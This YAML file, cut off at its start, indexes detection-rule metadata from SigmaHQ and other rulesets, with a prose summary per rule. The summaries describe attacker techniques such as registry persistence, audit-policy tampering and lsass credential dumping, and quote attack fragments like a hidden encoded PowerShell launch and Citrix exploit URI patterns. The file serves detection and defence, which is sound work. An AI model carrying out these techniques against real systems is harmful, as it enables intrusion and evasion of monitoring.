    access through common tools like "explorer.exe" or "powershell.exe." This technique
    can be leveraged for defense evasion, making it harder for users and some security
    tools to detect or access the hidden content. The "::$index_allocation" stream
    is a feature of the NTFS file system and provides a method for creating hidden
    directories. This detection is particularly useful as certain Endpoint Detection
    and Response (EDR) solutions, such as Crowdstrike, can capture this activity through
    command line history, even though standard logging mechanisms like Sysmon and
    ETW do not log the presence of such streams.
  Updated-Date: '2024_09_04'
0922467f-db53-4348-b7bf-dee8d0d348c6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bce8266937a956670dd35e5d25277a31
  Ruleset: sigmahq
  Summary: This rule detects modifications in conditional access policies performed
    by potentially unauthorized actors within an Azure environment. It focuses on
    monitoring audit logs for specific messages indicating the addition of a conditional
    access policy, which can suggest attempts at defense evasion or privilege escalation.
    Potential false positives include changes caused by misconfigured role permissions
    or legitimate actions by verified users or systems.
  Updated-Date: '2024_09_04'
092af964-4233-4373-b4ba-d86ea2890288:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 35770388cfc332e8b2c67c4d6f0db7f8
  Ruleset: sigmahq
  Summary: This rule detects when an attacker adds a new "Debugger" value to the "AeDebug"
    key in the Windows registry to achieve persistence. This persistence method triggers
    the debugger whenever an application crashes, potentially allowing malicious code
    to execute.
  Updated-Date: '2024_09_04'
092bc4b9-3d1d-43b4-a6b4-8c8acd83522f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3c0eb36dab6f77e72ee45eddd54559dd
  Ruleset: sigmahq
  Summary: This rule detects instances where essential PowerShell Core DLLs, specifically
    `System.Management.Automation.dll` and its related versions, are loaded by processes
    that are not typically associated with PowerShell. This type of behavior is often
    indicative of malicious activity, such as the use of meterpreter's "load powershell"
    extension. Various filters are applied to exclude known legitimate processes that
    may load these DLLs, including PowerShell executables, certain Windows system
    utilities, .NET framework components, SQL Server Management Studio, Visual Studio,
    Citrix, chocolatey, and specific security tools.
  Updated-Date: '2024_09_04'
0934ac71-a331-4e98-a034-d49c491fbbcb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 35775cb32f1442f24d0c3e04df70d35c
  Ruleset: emerging-threats
  Summary: This rule detects suspicious child processes spawned by "pc-app.exe," which
    may suggest potential exploitation of PaperCut MF/NG, a print management software.
    The detection focuses on identifying the execution of various command and script
    interpreters such as "bash.exe," "cmd.exe," "powershell.exe," and others that
    are not typically associated with routine operations of the PaperCut software.
    Identifying such processes can indicate malicious activity aimed at exploiting
    known vulnerabilities in PaperCut to execute code or commands on the system.
  Updated-Date: '2024_09_03'
093d68c7-762a-42f4-9f46-95e79142571a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99ce7b7b00d84f500110004d6462b458
  Ruleset: sigmahq
  Summary: This rule detects the use of the "nice" utility to execute a shell on Linux
    systems. This behavior can indicate attempts at privilege escalation, unauthorized
    command execution, or efforts to escape restricted environments. The detection
    focuses on process creations where the "nice" utility is used to invoke a shell
    such as bash, dash, fish, sh, or zsh.
  Updated-Date: '2024_09_04'
09438caa-07b1-4870-8405-1dbafe3dad95:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0d8edf30ba2ff60367aa6e34a1aee9b8
  Ruleset: core
  Summary: This rule detects when a user has been elevated to manage all Azure Subscriptions
    via ActivityLogs. This change could indicate a potential security threat, as it
    grants significant access to Azure resources within an environment. If such elevation
    was not planned, it should be immediately investigated to prevent unauthorized
    access and potential abuse by attackers.
  Updated-Date: '2024_09_03'
0944e002-e3f6-4eb5-bf69-3a3067b53d73:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2855d2a5ae489602c6010b90a6db0d6c
  Ruleset: core
  Summary: This rule detects the use of PowerShell scripts that set Access Control
    Lists (ACLs) on files within the Windows folder. It monitors process creation
    events involving PowerShell execution with the `Set-Acl` command and specific
    permission settings, such as `FullControl` or `Allow`, applied to paths within
    the Windows directory. This activity is often associated with defense evasion
    tactics.
  Updated-Date: '2024_09_03'
0955e4e1-c281-4fb9-9ee1-5ee7b4b754d2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 66c76f17072c0c6cac30c1fb7339b28e
  Ruleset: sigmahq
  Summary: This rule detects the execution of commands and binaries using the Program
    Compatibility Assistant (Pcalua.exe) on Windows systems. Pcalua.exe can be leveraged
    to bypass application whitelisting, allowing potentially malicious activities
    to occur unnoticed. The detection focuses on instances where Pcalua.exe is invoked
    with specific command line parameters indicative of this behavior. Legitimate
    uses can include batch scripts or actions performed by an administrator.
  Updated-Date: '2024_09_04'
09570ae5-889e-43ea-aac0-0e1221fb3d95:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cda482903ed0fcdc9107621f77f84967
  Ruleset: core
  Summary: This rule detects the removal of an exported Exchange mailbox on a Windows
    system, which may indicate an attempt to cover tracks following a ProxyShell exploit.
    The ProxyShell exploit targets Microsoft Exchange vulnerabilities to achieve remote
    code execution. By monitoring specific command keywords associated with mailbox
    export removal, this rule identifies potential unauthorized actions linked to
    this exploit.
  Updated-Date: '2024_09_03'
09576804-7a05-458e-a817-eb718ca91f54:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6e3c3bd76e23f8bc8546dc3b5403c1f7
  Ruleset: core
  Summary: This rule detects suspicious patterns of executing PowerShell scripts using
    the Invoke-Expression (IEX) alias. It identifies command lines that utilize IEX
    in potentially malicious ways, particularly when paired with methods to decode
    or manipulate strings, such as converting from Base64. The detection focuses on
    specific command line formats, including certain combinations and standalone instances
    of invoking IEX. This rule aims to uncover potentially harmful scripts leveraging
    IEX, which is often used in malicious PowerShell activity for executing code retrieved
    from various sources.
  Updated-Date: '2024_09_03'
09658312-bc27-4a3b-91c5-e49ab9046d1b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f834f4c80489bd4ef1b9962d94f10e9c
  Ruleset: sigmahq
  Summary: This rule detects attempts to use Windows Management Instrumentation Command
    (WMIC) to identify unquoted service paths through PowerShell scripts. This reconnaissance
    method is typically employed by attackers during penetration tests to enumerate
    services that could lead to privilege escalation. The detection relies on identifying
    specific PowerShell script commands that interact with Windows services, such
    as `Get-WmiObject` or `gwmi`, alongside service properties like `Win32_Service`,
    `Name`, `DisplayName`, `PathName`, and `StartMode`. These activities are often
    indicative of attackers searching for vulnerabilities in service configurations
    on Windows systems.
  Updated-Date: '2024_09_04'
09706624-b7f6-455d-9d02-adee024cee1d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3b0346de39b7351bfbd1859602eee713
  Ruleset: core
  Summary: This rule detects a typical pattern of CobaltStrike Beacon Object File
    (BOF) injection into other processes on Windows systems. It monitors specific
    call traces involving the system libraries ntdll.dll and KERNELBASE.dll, combined
    with unknown memory addresses. The rule also looks for specific access rights
    granted during process access events, which are indicative of potential code injection
    used by CobaltStrike, a penetration testing tool often employed for malicious
    purposes such as executing arbitrary code and evading defenses.
  Updated-Date: '2024_09_03'
09a910bf-f71f-4737-9c40-88880ba5913d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eb7eef46ab2be38ecf6637f0acff75a8
  Ruleset: sigmahq
  Summary: This rule detects the use of a bash one-liner to extract specific bytes
    from an image file and decode the base64 value to create a new file with the decoded
    content. It identifies commands involving the 'tail' utility for extracting byte
    ranges from images such as JPEG, PNG, and GIF files, combined with 'base64 --decode'
    to process and output the final file. This technique is often associated with
    defense evasion and tool obfuscation tactics.
  Updated-Date: '2024_09_04'
09d3b48b-be17-47f5-bf4e-94e7e75d09ce:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: daf23f8b2198bf850d6a7ab5bfc2b28a
  Ruleset: sigmahq
  Summary: This rule detects potential installation or installation attempts of known
    malicious AppX packages on Windows systems. Malicious AppX packages can exploit
    the Windows 10 apps mechanism, such as the BazarLoader malware that abuses this
    feature, to deploy malware. The detection is triggered by specific event IDs and
    known malicious package names. False positives may occur if a malicious package
    mimics the name and version of legitimate software.
  Updated-Date: '2024_09_04'
0a13e132-651d-11eb-ae93-0242ac130002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 85349bd6cd9a4f8bde312e5948690624
  Ruleset: core
  Summary: This rule detects the use of the auditpol binary to alter audit policy
    configurations on Windows systems, which is an action that threat actors might
    use to hinder detection capabilities. The detection focuses on specific command-line
    arguments associated with auditpol.exe involving the disabling, removing, clearing,
    or restoring of audit policies. While legitimate administrators or scripts may
    also utilize these commands, such activity warrants diligent monitoring due to
    its potential to compromise security monitoring and auditing processes.
  Updated-Date: '2024_09_03'
0a1f9d29-6465-4776-b091-7f43b26e4c89:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5ba5162455c69dc5db781bf35f2790a
  Ruleset: core
  Summary: This rule detects the deletion of a prefetch file on Windows systems, which
    may indicate an attempt to destroy forensic evidence. Prefetch files are utilized
    by Windows to speed up the application startup process, and their removal can
    be a tactic used in defense evasion. The rule specifically looks for deleted files
    in the `:\Windows\Prefetch\` directory with a `.pf` extension, and it filters
    out deletions performed by legitimate processes such as `svchost.exe` running
    under common authorized user accounts.
  Updated-Date: '2024_09_03'
0a3ff354-93fc-4273-8a03-1078782de5b7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bdf9181a54e377c5753af5aa7b8cf083
  Ruleset: core
  Summary: This rule detects remote RPC calls aimed at reading information about scheduled
    tasks through the SASec protocol. The logsource product involved is RPC Firewall,
    categorized under application logs. Focused on EventID 3 within the RPCFW EventLog,
    it monitors for the specific InterfaceUuid 378e52b0-c0a9-11cf-822d-00aa0051e40f,
    capturing potential recon activity. Certain operation numbers are filtered out
    to refine detection, indicating high-level security concerns around unauthorized
    information gathering.
  Updated-Date: '2024_09_03'
0a4f6091-223b-41f6-8743-f322ec84930b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1dcc4dc7846b0ced1ec5152473484570
  Ruleset: core
  Summary: This rule detects the execution of the Notepad++ updater (GUP.exe) in a
    suspicious directory, which is often associated with DLL side-loading attacks.
    DLL side-loading is a technique used by attackers to execute malicious code by
    exploiting the dynamic linking system of Windows. The rule looks for instances
    of GUP.exe running outside the standard Notepad++ updater directories to flag
    potentially malicious activity, thereby helping to identify unauthorized execution
    that may indicate a compromise or attack attempt.
  Updated-Date: '2024_09_03'
0a5177f4-6ca9-44c2-aacf-d3f3d8b6e4d2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5760e4abe61830fbe6bb529cf90ac632
  Ruleset: sigmahq
  Summary: This rule detects the creation of AWS API keys for one user by another
    user, which can indicate the presence of backdoored users intended to maintain
    persistence in the AWS environment. It helps identify potential unauthorized key
    flow within the organization.
  Updated-Date: '2024_09_04'
0a74c5a9-1b71-4475-9af2-7829d320d5c2:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c9c73cfe7938c70b70e667e5247bfd87
  Ruleset: emerging-threats
  Summary: This rule detects the execution of ChromeLoader malware by identifying
    the creation of a registered scheduled task. ChromeLoader is identified by its
    interaction with PowerShell, specifically when PowerShell is executed with the
    '-ExecutionPolicy Bypass -WindowStyle Hidden -E JAB' command line, followed by
    a command associated with loading an extension from the local directory in Chrome.
    The rule targets processes where the parent image is 'powershell.exe' and the
    final image executed is 'chrome.exe', indicating the malicious behavior typical
    of the ChromeLoader malware.
  Updated-Date: '2024_09_03'
0a98a10c-685d-4ab0-bddc-b6bdd1d48458:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: af83df81393b8c771594b1764d046853
  Ruleset: core
  Summary: This rule detects uncommon child processes of "userinit.exe," which may
    indicate the use of non-standard shells or login scripts for persistence mechanisms.
    It identifies processes spawned by "userinit.exe" and filters out those that typically
    occur, such as "explorer.exe," certain login scripts like "netlogon.bat" and "UsrLogon.cmd,"
    the default "PowerShell.exe" shell on Windows Core, and legitimate applications
    like "proquota.exe" and Citrix-related executables. The rule aims to distinguish
    between normal and potentially malicious behavior during the user initialization
    process, accounting for known exceptions and minimizing false positives by allowing
    for additional filters.
  Updated-Date: '2024_09_03'
0a99eb3e-1617-41bd-b095-13dc767f3def:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d1a3be0efd94fc7c7e18a96adac32699
  Ruleset: sigmahq
  Summary: This rule detects the usage of Jlaive, an antivirus evasion tool, to execute
    assemblies in a copied PowerShell environment. It identifies process creations
    where the parent process is either `cmd.exe` or a batch file. Specific suspicious
    activities involving `xcopy.exe` or `attrib.exe` are monitored, targeting command
    lines that include `powershell.exe`, `pwsh.exe`, and modifications applying hidden
    or system attributes to files with the `.bat.exe` extension.
  Updated-Date: '2024_09_04'
0ac15ec3-d24f-4246-aa2a-3077bb1cf90e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eb1d048e6b16b2e086a6c7f20baa1c86
  Ruleset: core
  Summary: This rule detects the creation of a new user account added to privileged
    groups such as "root" or "sudo" on Linux systems. It monitors system logs, looking
    for entries indicating user additions with specific UID or GID values, namely
    root (UID=0, GID=0), wheel (GID=10), and sudo (GID=27). The detection can help
    identify administrative activities or potential unauthorized access attempts by
    tracking when new users gain privileged status.
  Updated-Date: '2024_09_03'
0adc67e0-a68f-4ffd-9c43-28905aad5d6a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2f4c8d083905c77f2cb89149217fb030
  Ruleset: core
  Summary: This rule detects the creation of default named pipes used by the Koh tool,
    which is typically associated with privilege escalation and credential access
    activities on Windows systems. The specific named pipes include '\imposecost'
    and '\imposingcost', which are created during the operation of the Koh tool.
  Updated-Date: '2024_09_03'
0adfbc14-0ed1-11eb-adc1-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f2d0a8fe590257a8738f45b0bc6f6c79
  Ruleset: core
  Summary: This rule detects the obfuscated use of environment variables to execute
    PowerShell scripts. It specifically identifies patterns in script block text that
    suggest environment variable manipulation to evade detection, utilizing obfuscation
    techniques often associated with malicious activities. The detection criteria
    are based on regular expressions that match these obfuscation methods, aiming
    to capture suspicious command-line activity involving the combination of `cmd`
    commands, `set` operations, and specific formatting functions. False positives
    are generally unknown.
  Updated-Date: '2024_09_03'
0afbd410-de03-4078-8491-f132303cb67d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1fc6a9d36c86622967ae535c1655e687
  Ruleset: core
  Summary: This rule detects the execution of a renamed "client32.exe" associated
    with NetSupport RAT by monitoring specific indicators such as Imphash, Product
    name, and OriginalFileName strings. NetSupport RAT is a remote administration
    tool often misused for malicious purposes such as unauthorized remote control
    and surveillance. The rule identifies the presence of this tool by checking the
    Product field for mentions of 'NetSupport Remote Control' and ensuring the OriginalFileName
    is 'client32.exe', combined with an Imphash value of a9d50692e95b79723f3e76fcf70d023e,
    while excluding instances where the Image path ends with '\client32.exe'.
  Updated-Date: '2024_09_03'
0b0cd537-fc77-4e6e-a973-e53495c1083d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 77e846c6e819b60a1acc136c0765230d
  Ruleset: core
  Summary: This rule detects the execution of renamed Microsoft Office binaries such
    as Excel, Access, Publisher, OneNote, Outlook, PowerPoint, and Word. It identifies
    processes where the original file name and description match one of these Office
    applications but are executed under an unexpected or renamed binary, which could
    indicate an attempt at defense evasion or malicious activity involving these commonly
    trusted applications.
  Updated-Date: '2024_09_03'
0b0ea3cc-99c8-4730-9c53-45deee2a4c86:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 788f9dd901faefdb684303c3f0ce72cc
  Ruleset: core
  Summary: This rule detects instances where the Code Integrity (CI) engine blocks
    Microsoft Defender processes, specifically MpCmdRun.exe and NisSrv.exe, from loading
    unsigned DLLs. This activity may indicate an attempt to sideload arbitrary DLLs,
    which can be a method used by malicious actors for defense evasion and executing
    unauthorized code.
  Updated-Date: '2024_09_03'
0b4ae027-2a2d-4b93-8c7e-962caaba5b2a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c10df0c757865d8237f9a517debfdda4
  Ruleset: core
  Summary: This rule detects the usage of the Time Travel Debugging Utility, tttracer.exe,
    which adversaries may use to execute malicious processes and dump credentials
    from processes like lsass.exe.
  Updated-Date: '2024_09_03'
0b4b72e3-4c53-4d5b-b198-2c58cfef39a9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 04cfa3c957531e25ae9f4eeb611b9ac8
  Ruleset: sigmahq
  Summary: This rule detects attempts by users who do not have the necessary permissions
    to invite guest users in an Azure environment. It identifies incidents where such
    unauthorized users try to invite an external user but fail. This monitoring is
    crucial for maintaining security as it prevents unauthorized access and identifies
    potential security breaches linked to the misuse of invitation privileges.
  Updated-Date: '2024_09_04'
0b7163dc-7eee-4960-af17-c0cd517f92da:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6480ceeabc36e6472753b18638948f93
  Ruleset: sigmahq
  Summary: This rule detects the usage of wmic.exe to start or stop a service on Windows
    systems. By monitoring the process creation category, it identifies instances
    where the command line arguments include terms related to service management,
    such as 'stopservice' or 'startservice'. This activity is relevant for detecting
    potential execution of commands that could be used for privilege escalation or
    lateral movement within a network.
  Updated-Date: '2024_09_04'
0b7889b4-5577-4521-a60a-3376ee7f9f7b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2c00e0aa19d529d54fd0832333fd445
  Ruleset: sigmahq
  Summary: This rule detects suspicious activities related to WMI (Windows Management
    Instrumentation) persistence mechanisms by monitoring specific events and logs.
    It focuses on identifying actionable WMI event filters and command line event
    consumers, such as `ActiveScriptEventConsumer` and `CommandLineEventConsumer`,
    which may indicate attempts of privilege escalation or persistence by adversaries.
    Events with specific IDs (5861 and 5859) are scrutinized, suggesting unusual bindings
    and registrations. Additionally, the rule filters out certain service control
    manager events to reduce false positives.
  Updated-Date: '2024_09_04'
0b80ade5-6997-4b1d-99a1-71701778ea61:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bb5619251f1f78c7484ce3871e32d6f9
  Ruleset: core
  Summary: This rule detects the import of an alternate data stream (ADS) to the Windows
    registry using regedit.exe. It identifies specific command-line arguments and
    filenames associated with this activity. The detection checks for the presence
    of typical indicators in the command line of the process and applies filters to
    exclude certain common scenarios. This activity is associated with defense evasion
    tactics commonly employed by adversaries.
  Updated-Date: '2024_09_03'
0b9ad457-2554-44c1-82c2-d56a99c42377:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c341ad84e38e2d60d77f8ed198ac98fe
  Ruleset: sigmahq
  Summary: This rule detects the presence of temporary artifacts created by the remote
    access software AnyDesk on Windows systems. AnyDesk is often used for legitimate
    desktop support and remote access but can also be utilized by adversaries to establish
    interactive command and control channels within target networks. The rule specifically
    looks for filenames related to AnyDesk configurations, such as 'user.conf' and
    'system.conf', located in the AppData\Roaming\AnyDesk directory. While legitimate
    use of AnyDesk could trigger this detection, it is essential for monitoring potential
    unauthorized remote access activities.
  Updated-Date: '2024_09_04'
0ba1da6d-b6ce-4366-828c-18826c9de23e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 90aa734dfa0d0e468d87853bdd213d57
  Ruleset: core
  Summary: This rule detects the execution of renamed binaries that are commonly used
    by attackers or malware. It leverages the Sysmon OriginalFileName datapoint to
    identify such potentially suspicious activities. The binaries monitored include
    essential system and administrative tools such as `certutil.exe`, `powershell.exe`,
    `psexec.exe`, `reg.exe`, `rundll32.exe`, `wmic.exe`, among others. The rule is
    intended to uncover attempts at defense evasion by identifying when these critical
    binaries have been renamed and executed, which is a common tactic used by malicious
    actors to bypass security controls. Due to the possibility of false positives
    from custom applications that rename these binaries, a whitelist can be maintained
    to manage legitimate cases.
  Updated-Date: '2024_09_03'
0ba863e6-def5-4e50-9cea-4dd8c7dc46a4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0fa654f5ab29e29e04a0fffa2d61890d
  Ruleset: core
  Summary: This rule detects the malicious use of a control panel item on Windows
    systems. It identifies suspicious activity by monitoring the creation of processes
    related to the 'reg.exe' application with specific command line arguments indicative
    of modifications to Control Panel items. The rule also looks for command lines
    ending with '.cpl' files commonly associated with Control Panel items. Additionally,
    it filters out benign or legitimate uses of certain system and Intel Graphics
    Control Panel files to reduce false positives. This is aimed at identifying potential
    execution, defense evasion, and persistence tactics used by attackers.
  Updated-Date: '2024_09_03'
0bb4bbeb-fe52-4044-b40c-430a04577ebe:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ec7b852ac26a72272504d21d427afd0d
  Ruleset: core
  Summary: This rule detects the download of a file with potentially suspicious extensions,
    such as .bat, .exe, .dll, .docm, .ps1, .xll, among others, from a .zip top-level
    domain. It aims to identify potentially dangerous activities that might be associated
    with files downloaded from such domains, which could be used for malicious purposes
    like executing harmful scripts or binary data by appending ":Zone" to the filename.
  Updated-Date: '2024_09_03'
0bbc6369-43e3-453d-9944-cae58821c173:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3f312f72ee80d1d3805178264df06cf2
  Ruleset: core
  Summary: This rule detects the execution of the Windows Control Panel application
    (control.exe) initiated by the WorkFolders executable (WorkFolders.exe). WorkFolders.exe
    is a legitimate Windows feature used for file synchronization across devices,
    but it may be exploited for malicious purposes, such as defense evasion. The rule
    filters out legitimate instances where control.exe is located in the standard
    system directory, helping to identify suspicious activity more accurately.
  Updated-Date: '2024_09_03'
0bbcd74b-0596-41a4-94a0-4e88a76ffdb3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7b5d954c7241f5da42533005dcbbbb2a
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of CVE-2021-27905, a vulnerability
    affecting all Apache Solr versions prior to and including 8.8.1. The rule identifies
    patterns in web server logs that suggest the exploitation of this vulnerability,
    such as specific URL queries involving the '/solr/' path and response status codes
    of 200. This is used to recognize potentially malicious activity aiming to exploit
    the arbitrary file read and server-side request forgery (SSRF) flaws associated
    with CVE-2021-27905.
  Updated-Date: '2024_09_03'
0bcfabcb-7929-47f4-93d6-b33fb67d34d1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eef2d3f8e7fa5def861146253ba007b7
  Ruleset: core
  Summary: "This rule detects the presence of `javaw.exe` within the AppData folder,\
    \ an indicator associated with the Adwind and JRAT malware. Adwind and JRAT are\
    \ remote access trojans (RATs) that can be used by attackers to gain unauthorized\
    \ control over infected systems. This rule specifically looks for paths containing\
    \ `\\AppData\\Roaming\\Oracle\\bin\\java` and filenames with the `.exe` extension,\
    \ as well as the presence of `.vbs` files with the term \u201C\\Retrive\u201D\
    . These indicators help in identifying potential infections that rely on these\
    \ particular files and locations within a Windows environment."
  Updated-Date: '2024_09_03'
0c3fac91-5627-46e8-a6a8-a0d7b9b8ae1b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 22946af0d556a2bf82a2782dd8d6595b
  Ruleset: core
  Summary: This rule detects the creation of a malicious executable named Get-Variable.exe
    within the WindowsApps directory, which is executed when the Get-Variable command
    is used in PowerShell. This behavior leverages the default path settings in PowerShell
    where the system may execute the rogue executable instead of the legitimate PowerShell
    cmdlet, thereby facilitating persistence and defense evasion techniques possibly
    linked to malware such as Colibri Loader.
  Updated-Date: '2024_09_03'
0c718a5e-4284-4fb9-b4d9-b9a50b3a1974:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f86b539976179bd966471b1bc739245b
  Ruleset: core
  Summary: This rule detects the obfuscated use of standard input (stdin) to execute
    PowerShell commands in a Windows environment. It identifies the creation of new
    services (EventID 4697) where the service filename contains specific indicators
    such as 'cmd', 'powershell', '${input}', 'noexit', ' /c ', or ' /r '. This technique
    is often employed to evade defenses by obscuring the nature of the commands being
    executed, making it a notable tactic for defense evasion and malicious script
    execution.
  Updated-Date: '2024_09_03'
0c92f2e6-f08f-4b73-9216-ecb0ca634689:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0a3f3461691137a31adfecc93cffd0a7
  Ruleset: sigmahq
  Summary: This rule detects the use of rcedit, a tool known for editing resources
    of executable (PE) files, to potentially alter PE metadata properties. This activity
    could be an attempt to rename system utilities to evade detection by security
    systems. Key indicators include the command line options involving metadata fields
    such as `OriginalFileName`, `CompanyName`, `FileDescription`, `ProductName`, `ProductVersion`,
    and `LegalCopyright`. This behavior can be flagged as a potential defense evasion
    tactic, though legitimate use by administrators to update binary metadata is a
    possible false positive.
  Updated-Date: '2024_09_04'
0c93308a-3f1b-40a9-b649-57ea1a1c1d63:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 616677e898212ee365956e25115349fb
  Ruleset: sigmahq
  Summary: This rule detects changes to Windows Registry settings that disable Windows
    Security Center notifications by setting the `Notification_Suppress` value to
    `1`. This action falls under the defense evasion tactics where an attacker may
    attempt to disable security alerts to avoid detection.
  Updated-Date: '2024_09_04'
0c97c1d3-4057-45c9-b148-1de94b631931:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 87d916e00627715a7498e40a0e4ab286
  Ruleset: sigmahq
  Summary: This rule detects when a policy rule in Okta is modified or deleted. Okta
    is an identity and access management service that allows organizations to manage
    user authentication and authorization. The detection rule focuses on identifying
    changes to policy rules, which may include updates or deletions, ensuring that
    any alterations to security policies are captured.
  Updated-Date: '2024_09_04'
0c9b3bda-41a6-4442-9345-356ae86343dc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 855ddac2ed944d959aa73be54446a0f6
  Ruleset: sigmahq
  Summary: This rule detects the creation or modification of Kubernetes CronJobs or
    Jobs. Kubernetes Jobs are used to create one or more pods to complete specific
    tasks, and CronJobs create these Jobs on a recurring schedule. Adversaries can
    exploit these objects to schedule the execution of containers with malicious code
    within a cluster, potentially achieving persistence in the system.
  Updated-Date: '2024_09_04'
0cb8d736-995d-4ce7-a31e-1e8d452a1459:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 24622bfd4c7ef085cca0a771d06aa46d
  Ruleset: core
  Summary: This rule detects tampering with the EventLog service "file" key to change
    the default location of an .evtx file. This technique can be used to interfere
    with log collection and alerting mechanisms by directing logs to a non-standard
    path. Specifically, it identifies modifications in the Windows Registry related
    to EventLog file locations, ensuring that logs are still directed to the default
    directory except for legitimate changes.
  Updated-Date: '2024_09_03'
0cf2e1c6-8d10-4273-8059-738778f981ad:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f05a6039540c566617dca4b1c8e306b9
  Ruleset: core
  Summary: This rule detects potential abuse of the "ReflectDebugger" registry value
    in the WerFault settings for persistence. WerFault is a Windows Error Reporting
    tool, and manipulating this registry value can be a method of executing malicious
    code or maintaining persistence on a compromised system. This technique involves
    the modification of the Windows registry, specifically targeting the path ending
    with '\Microsoft\Windows\Windows Error Reporting\Hangs\ReflectDebugger'. This
    type of manipulation is typically associated with tactics used for evasion and
    persistence by malware or attackers.
  Updated-Date: '2024_09_03'
0cf7a157-8879-41a2-8f55-388dd23746b7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7fea5a432761f018d77dcd87f62eb0c6
  Ruleset: core
  Summary: This rule detects events with patterns found in commands used for reconnaissance
    activities on Linux systems. Specifically, it looks for command lines that contain
    searches for files with the name `.htpasswd` or permissions set with the `-4000`
    flag, which typically indicate attempts to discover sensitive files and privilege
    escalation mechanisms.
  Updated-Date: '2024_09_03'
0d0d9a8a-a49e-4e27-b061-7ce4b936cfb7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 983771aa51d73db7c9ad9cc3c170fb2a
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts against Citrix Netscaler, Application
    Delivery Controller (ADS), and Citrix Gateway by monitoring for vulnerabilities
    identified as CVE-2020-8193 and CVE-2020-8195. It specifically looks for suspicious
    patterns in web server URI queries, such as requests containing "/rapi/filedownload?filter=path:%2F"
    or queries related to '/pcidss/report' with certain parameters like 'type=all_signatures'
    and 'sig_name=_default_signature_'. These detections are indicative of potential
    attempts to exploit the vulnerabilities, which are critical in nature, allowing
    for unauthorized access or control over the affected systems.
  Updated-Date: '2024_09_03'
